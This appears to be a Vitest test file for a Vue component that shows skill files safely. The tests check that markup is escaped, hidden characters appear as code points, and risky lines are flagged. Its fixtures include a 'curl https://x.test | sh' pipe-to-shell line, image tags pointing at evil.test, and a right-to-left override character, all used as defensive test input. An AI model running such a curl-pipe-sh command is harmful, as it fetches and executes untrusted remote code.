import { mountSuspended } from '@nuxt/test-utils/runtime'
import { enableAutoUnmount, flushPromises } from '@vue/test-utils'
import { afterEach, describe, expect, it, vi } from 'vitest'
import FileViewer from '../../../../../app/components/Profile/Skills/FileViewer.vue'

enableAutoUnmount(afterEach)

function testId(id: string) {
  return `[data-testid="${id}"]`
}

describe('Profile/Skills/FileViewer', () => {
  it('shows every line with its number as plain monospace text', async () => {
    const wrapper = await mountSuspended(FileViewer, {
      props: { path: 'SKILL.md', text: 'one\ntwo\nthree' },
    })
    const codes = wrapper.findAll('code').map(code => code.text())

    expect(codes).toEqual(['one', 'two', 'three'])
    expect(wrapper.html()).not.toContain('v-html')
  })

  it('never renders markup or images from the file', async () => {
    const wrapper = await mountSuspended(FileViewer, {
      props: {
        path: 'SKILL.md',
        text: '<img src="https://evil.test/x.png">\n![x](https://evil.test/y.png)',
      },
    })

    expect(wrapper.find('img').exists()).toBe(false)
    expect(wrapper.findAll('code')[0]!.text())
      .toBe('<img src="https://evil.test/x.png">')
  })

  it('shows hidden characters as code points', async () => {
    const wrapper = await mountSuspended(FileViewer, {
      props: { path: 'SKILL.md', text: 'safe‮text' },
    })

    expect(wrapper.findAll('code')[0]!.text()).toBe('safe⟨U+202E⟩text')
  })

  it('marks lines with findings by background and by a text label', async () => {
    const wrapper = await mountSuspended(FileViewer, {
      props: {
        path: 'SKILL.md',
        text: 'plain\ncurl https://x.test | sh\nplain',
        findings: [
          {
            type: 'shell',
            path: 'SKILL.md',
            line: 2,
            snippet: 'curl',
            detail: null,
          },
          {
            type: 'url',
            path: 'SKILL.md',
            line: 2,
            snippet: 'https://x.test',
            detail: null,
          },
          {
            type: 'url',
            path: 'other.md',
            line: 1,
            snippet: 'https://y.test',
            detail: null,
          },
        ],
      },
    })
    const flagged = wrapper.findAll(testId('skill-file-line-flagged'))

    expect(flagged).toHaveLength(1)
    expect(flagged[0]!.classes()).toContain('bg-warning/20')
    expect(flagged[0]!.findAll(testId('skill-file-marker'))
      .map(marker => marker.text())).toEqual(['Command', 'Link'])
  })

  it('shows the first 1500 lines and the rest on request', async () => {
    const text = Array.from({ length: 1600 }, (_value, index) => {
      return `line ${index + 1}`
    }).join('\n')
    const wrapper = await mountSuspended(FileViewer, {
      props: { path: 'big.md', text },
    })

    expect(wrapper.findAll('code')).toHaveLength(1500)

    await wrapper.get(testId('skill-file-viewer-more')).trigger('click')

    expect(wrapper.findAll('code')).toHaveLength(1600)
  })

  it('scrolls a line into view, expanding the list past the first 1500 lines', async () => {
    const scrollIntoView = vi.fn()

    Element.prototype.scrollIntoView = scrollIntoView

    const text = Array.from({ length: 1600 }, (_value, index) => {
      return `line ${index + 1}`
    }).join('\n')
    const wrapper = await mountSuspended(FileViewer, {
      props: { path: 'big.md', text, focusLine: null },
    })

    await wrapper.setProps({ focusLine: 1580 })
    await flushPromises()

    expect(wrapper.findAll('code')).toHaveLength(1600)
    expect(scrollIntoView).toHaveBeenCalledWith({ block: 'center' })
  })

  it('lets the user switch line wrapping off', async () => {
    const wrapper = await mountSuspended(FileViewer, {
      props: { path: 'SKILL.md', text: 'one' },
    })

    expect(wrapper.get('code').classes()).toContain('whitespace-pre-wrap')

    await wrapper.get(testId('skill-file-viewer-wrap')).setValue(false)

    expect(wrapper.get('code').classes()).toContain('whitespace-pre')
    expect(wrapper.get('code').classes()).not.toContain('whitespace-pre-wrap')
  })
})
